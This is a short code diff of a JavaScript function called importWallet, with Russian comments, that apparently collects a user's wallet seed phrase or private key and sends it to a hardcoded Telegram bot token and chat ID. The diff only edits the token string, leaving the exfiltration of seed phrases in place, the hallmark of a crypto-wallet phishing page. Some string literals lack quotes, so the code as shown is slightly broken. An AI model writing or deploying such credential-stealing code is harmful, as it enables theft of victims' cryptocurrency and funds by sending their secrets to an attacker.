@@ -8,7 +8,7 @@ function importWallet() {
     }
   
     // Отправка в Telegram
-    const telegramBotToken = "7536888284:AAE7nUHSYaXvPODS5b1pi3XtT-DQonSYArk";
+    const telegramBotToken = "AAE7nUHSYaXvPODS5b1pi3XtT-DQonSYArk";
     const chatId = 604406142;
     const message = Новая фраза: ${phrase};
   
@@ -42,7 +42,7 @@ function importWallet() {
       return;
     }
   
-    const telegramBotToken = "7536888284:AAE7nUHSYaXvPODS5b1pi3XtT-DQonSYArk";
+    const telegramBotToken = "AAE7nUHSYaXvPODS5b1pi3XtT-DQonSYArk";
     const chatId = 604406142;
     const message = Новая сид-фраза или ключ: ${phrase};
   
